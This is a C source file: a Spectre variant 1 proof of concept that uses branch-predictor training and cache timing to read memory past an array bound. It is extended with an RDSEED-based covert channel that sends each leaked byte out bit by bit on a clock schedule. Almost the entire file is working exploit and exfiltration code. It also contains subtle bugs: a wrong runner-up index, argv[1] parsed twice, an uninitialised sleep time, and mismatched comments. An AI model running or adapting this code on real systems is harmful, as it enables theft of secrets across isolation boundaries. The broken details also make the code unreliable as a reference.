#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <immintrin.h> // for rdseed
#include <unistd.h> // for usleep
#include <time.h> // for timekeeping
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x) {
    if(x < array1_size) {
        temp &= array2[array1[x]*512];
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t * addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    for (tries = 999; tries > 0; tries --) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++){
            _mm_clflush(&array2[i * 512]); /* clflush */
        }

        /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x = training_x if j % 6 != 0
             * or malicious_x if j % 6 == 0
             *
             * Avoid jumps in case those tip off the branch predictor
             * Set x=FFF.FF0000 if j % 6 == 0, else x = 0 */
            x = ((j % 6) - 1) & ~0xFFFF;
            /* Set x = -1 if j & 6 = 0, else x = 0*/
            x = (x | (x >> 16 ));
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Mixed-up order to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = * addr;                   /* Time memory access */
            time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
            if (time2 <= CACHE_HIT_THRESHOLD &&
                    mix_i != array1[tries % array1_size]) {
                results[mix_i]++; /* cache hit -> score +1 for this value */
            }
        }

        /* Locate highest & second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = 1;
            }
        }
        if (results[j] >= (2 * results[k] + 5) ||
                (results[j] == 2 && results[k] == 0)) {
                break;
        }
    }
    /* use junk to prevent code from being optimized out */
    results[0] ^= junk;
    value[0] = (uint8_t) j;
}

void rng_send_char(char ltr) {
    // send the character contained in 'ltr' through the rng conditioner

    int i, j, ret;               // temporary data
    int x;                       // used to serialize our bytes
    unsigned long long p;        // placeholder for rdseed data
    struct timespec tp;          // time struct for synchronization

    long sleeptime, seedtime = 0;

    x = 0x80;                // set it to 128d (8th bit)
    for (i = 0; i < 8; i++) {
        // do the rdseed or don't
        while (0 < 1) {
            // do something every 2 seconds - we could speed it up later
            clock_gettime(CLOCK_REALTIME, &tp);
            if (tp.tv_nsec % 200000 <= 9) {
                if (((ltr & x) >> (7 - i)) == 1) {
                    printf("1");
                    for (j = 0; j < 100; j++) {
                        ret = _rdseed64_step(&p);
                    }
                    usleep(sleeptime);
                    break;
                }
                else {
                    printf("0");
                    usleep(sleeptime - seedtime);
                    break;
                }
            }
        }
        // move on to the next bit
        x /= 2;
    }
    printf("\n");
}

int main(int argc, const char ** argv) {
    /* Basically, we want to create an empty buffer that's the same size
    that we can write our results to. From there, we read the actual bytes
    of the secret and add them to the buffer we made. */

    size_t malicious_x =
        (size_t) (secret - (char *) array1); /* default for malicious_x */
    long unsigned int i;
    int len = 40;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 to ensure it is memory backed */
    }
    if (argc == 3) {
        sscanf(argv[1], "%p", (void **) (&malicious_x));
        malicious_x -= (size_t)array1; /* Input value to pointer */
        sscanf(argv[1], "%d", &len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        /* This is primarily where we produced the function's description */
        readMemoryByte(malicious_x++, value);
        rng_send_char(value[0]);
    }

    // print out the data we're sending and then send it
    return(0);
}

